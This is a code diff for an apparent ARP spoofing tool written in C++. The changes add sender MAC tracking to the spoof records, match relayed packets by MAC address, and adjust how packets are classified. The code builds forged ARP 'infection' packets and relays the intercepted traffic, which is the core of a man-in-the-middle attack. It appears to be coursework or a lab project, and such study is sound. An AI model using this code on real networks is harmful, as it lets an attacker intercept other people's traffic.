@@ -18,13 +18,14 @@ using namespace std;
 #pragma pack(push, 1)
 struct Spoof final{
     Spoof(){}
-    Spoof(Ip sip, Ip tip,Mac tmac,EthArpPacket pckt){
-		sip_=sip; tip_=tip; tmac_=tmac; infctpckt=pckt; 
+    Spoof(Ip sip, Ip tip,Mac smac, Mac tmac,EthArpPacket pckt){
+		sip_=sip; tip_=tip; tmac_=tmac; smac_=smac; infctpckt=pckt; 
 	}
 public:
 	Ip sip_;
     Ip tip_;
 	Mac tmac_;
+	Mac smac_;
     EthArpPacket infctpckt;
 };
 #pragma pack(pop)
@@ -85,13 +86,14 @@ void Relay(pcap_t* handle, const u_char* packet){
 	EthHdr* ethinfo=(EthHdr*)packet;
 	IpHdr* ipinfo=(IpHdr*)(packet+14);
 	int size=14+ntohs(ipinfo->ip_len);
+	 //string(ethinfo->smac_)<<" to "<<string(ethinfo->dmac_)<<" received"
 	u_char* relaypacket=(u_char*)malloc(sizeof(char)*size);
 	memcpy(relaypacket, packet, sizeof(char)*size);
 	EthHdr* ethhdr=(EthHdr*)relaypacket;
 	IpHdr* iphdr=(IpHdr*)(relaypacket+14);
 	Ip dip=Ip(ntohl((uint32_t)iphdr->ip_src));
 	for(int i=0; i<idx; i++){
-		if(spoofarr[i].sip_==dip){
+		if(spoofarr[i].smac_==ethhdr->smac_){
 			flag=1;
 			ethhdr->smac_=ethhdr->dmac_;
 			ethhdr->dmac_=spoofarr[i].tmac_;
@@ -100,7 +102,6 @@ void Relay(pcap_t* handle, const u_char* packet){
 	}
 	if(flag==1){
 		pcap_sendpacket(handle, relaypacket, size);
-		printf("relay completed\n");
 	}
 }
 void SendInfectFlood(pcap_t* handle){
@@ -134,10 +135,12 @@ int parsing(const u_char* packet, Ip mip){
 	else if(ntohs(ethhdr->type_)==EthHdr::Ip4 ||ntohs(ethhdr->type_)==EthHdr::Ip6){
 		IpHdr* iphdr=(IpHdr*)(packet+14);
 		Ip dip=ntohl(iphdr->ip_dst);
-		if(ntohl(iphdr->ip_src)==(uint32_t)mip)
+		if(dip==mip)
 			return -1;
-		else
-			return RELAY;
+		for(int i=0; i<idx; i++){
+			if(ethhdr->smac_==spoofarr[i].smac_)
+				return RELAY;
+		}
 	}
 	return -1;
 }
@@ -157,7 +160,7 @@ void init(pcap_t* handle,Ip senderip, Ip targetip, Ip myip, Mac mmac){
 	packet.arp_.sip_ = htonl(targetip);//ip of target
 	packet.arp_.tmac_ = smac;//mac of sender
 	packet.arp_.tip_ = htonl(senderip);//ip of sender
-	Spoof result=Spoof(senderip, targetip, tmac, packet);
+	Spoof result=Spoof(senderip, targetip, smac, tmac, packet);
 	memcpy(&spoofarr[idx++],&result,sizeof(Spoof));
 }
 int main(int argc, char* argv[]) {
